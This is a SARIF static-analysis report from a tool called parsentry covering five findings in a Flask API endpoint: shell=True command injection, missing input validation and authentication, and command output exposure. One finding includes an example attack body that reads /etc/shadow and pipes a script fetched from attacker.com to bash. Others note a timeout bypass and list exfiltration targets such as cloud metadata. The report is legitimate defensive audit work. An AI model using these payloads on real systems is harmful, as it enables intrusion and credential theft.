{
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "parsentry",
          "version": "0.1.0",
          "rules": [
            {
              "id": "RCE-001",
              "name": "ArbitraryCommandExecution",
              "shortDescription": {
                "text": "Arbitrary OS command execution via subprocess.run with shell=True"
              },
              "fullDescription": {
                "text": "User-controlled input is passed directly to subprocess.run() with shell=True, granting full remote code execution. The attacker can execute any command the application process can run."
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/78.html",
              "properties": {
                "tags": [
                  "security",
                  "RCE",
                  "CWE-78",
                  "OS-command-injection"
                ]
              }
            },
            {
              "id": "RCE-002",
              "name": "NoInputSanitization",
              "shortDescription": {
                "text": "No input validation or sanitization on command parameter"
              },
              "fullDescription": {
                "text": "The command parameter from the JSON body is used without any allowlisting, regex filtering, length check, or escaping."
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/20.html",
              "properties": {
                "tags": [
                  "security",
                  "input-validation",
                  "CWE-20"
                ]
              }
            },
            {
              "id": "RCE-003",
              "name": "ShellMetacharacterInjection",
              "shortDescription": {
                "text": "shell=True enables command chaining via shell metacharacters"
              },
              "fullDescription": {
                "text": "The shell=True flag causes the command to be interpreted by /bin/sh, enabling metacharacter abuse (;, &&, ||, |, $(), backticks) for chaining arbitrary commands."
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/78.html",
              "properties": {
                "tags": [
                  "security",
                  "RCE",
                  "CWE-78",
                  "shell-injection"
                ]
              }
            },
            {
              "id": "INFO-DISCLOSURE-001",
              "name": "CommandOutputExposure",
              "shortDescription": {
                "text": "Full command output returned to unauthenticated caller"
              },
              "fullDescription": {
                "text": "stdout, stderr, and return code are returned in the HTTP response, enabling data exfiltration of any server-side resource."
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/200.html",
              "properties": {
                "tags": [
                  "security",
                  "information-disclosure",
                  "CWE-200"
                ]
              }
            },
            {
              "id": "AUTH-001",
              "name": "MissingAuthenticationOnCriticalEndpoint",
              "shortDescription": {
                "text": "No authentication or authorization on command execution endpoint"
              },
              "fullDescription": {
                "text": "The endpoint has no authentication decorator, token check, session validation, or API key requirement. Any network-reachable client can execute commands."
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/306.html",
              "properties": {
                "tags": [
                  "security",
                  "authentication",
                  "CWE-306"
                ]
              }
            }
          ]
        }
      },
      "results": [
        {
          "ruleId": "RCE-001",
          "level": "error",
          "message": {
            "text": "User-supplied 'command' parameter from JSON body is passed directly to subprocess.run(command, shell=True). An attacker sends POST /api/exec/command with body {\"command\":\"id; cat /etc/shadow; curl attacker.com/shell.sh|bash\"} to achieve full remote code execution. The timeout=10 is trivially bypassed by backgrounding processes (e.g., 'nohup payload &')."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "api.py",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 171,
                  "endLine": 177,
                  "startColumn": 9
                }
              },
              "logicalLocations": [
                {
                  "name": "execute_command",
                  "kind": "function"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "RCE-001:api.py:execute_command:171"
          },
          "properties": {
            "confidence": 1.0,
            "attack_vector": "network",
            "cwe": [
              "CWE-78"
            ],
            "owasp": [
              "A03:2021-Injection"
            ]
          }
        },
        {
          "ruleId": "RCE-002",
          "level": "error",
          "message": {
            "text": "The command value is extracted via data.get('command', '') with no validation whatsoever. No allowlist of permitted commands, no regex filter, no character-set restriction, no length limit. The empty-string default is the only guard, but any non-empty input is executed verbatim."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "api.py",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 167,
                  "endLine": 167,
                  "startColumn": 5
                }
              }
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "RCE-002:api.py:execute_command:167"
          },
          "properties": {
            "confidence": 1.0,
            "cwe": [
              "CWE-20"
            ]
          }
        },
        {
          "ruleId": "RCE-003",
          "level": "error",
          "message": {
            "text": "shell=True invokes /bin/sh to interpret the command string. This enables shell metacharacter injection: semicolons for chaining (;), pipes (|), logical operators (&&, ||), command substitution ($(), backticks), and redirection (>, >>). Even if partial validation existed, shell interpretation would create bypass vectors."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "api.py",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 173,
                  "endLine": 173,
                  "startColumn": 13
                }
              }
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "RCE-003:api.py:shell_true:173"
          },
          "properties": {
            "confidence": 1.0,
            "cwe": [
              "CWE-78"
            ]
          }
        },
        {
          "ruleId": "INFO-DISCLOSURE-001",
          "level": "error",
          "message": {
            "text": "The JSON response returns result.stdout, result.stderr, and result.returncode, providing full output of any executed command. Combined with RCE, this enables exfiltration of /etc/passwd, environment variables with secrets, database credentials, cloud metadata (169.254.169.254), private keys, and internal network topology."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "api.py",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 179,
                  "endLine": 183,
                  "startColumn": 9
                }
              }
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "INFO-DISCLOSURE-001:api.py:execute_command:179"
          },
          "properties": {
            "confidence": 1.0,
            "cwe": [
              "CWE-200"
            ]
          }
        },
        {
          "ruleId": "AUTH-001",
          "level": "error",
          "message": {
            "text": "The execute_command() handler has no authentication or authorization checks. No @login_required decorator, no JWT token verification, no API key validation, no session check. Any unauthenticated HTTP client that can reach the server can execute arbitrary OS commands."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "api.py",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 163,
                  "endLine": 164,
                  "startColumn": 1
                }
              }
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "AUTH-001:api.py:execute_command:163"
          },
          "properties": {
            "confidence": 1.0,
            "cwe": [
              "CWE-306"
            ],
            "owasp": [
              "A07:2021-Identification-and-Authentication-Failures"
            ]
          }
        }
      ],
      "artifacts": [
        {
          "location": {
            "uri": "api.py",
            "uriBaseId": "%SRCROOT%"
          },
          "description": {
            "text": "Flask API blueprint with command execution endpoint"
          }
        }
      ]
    }
  ]
}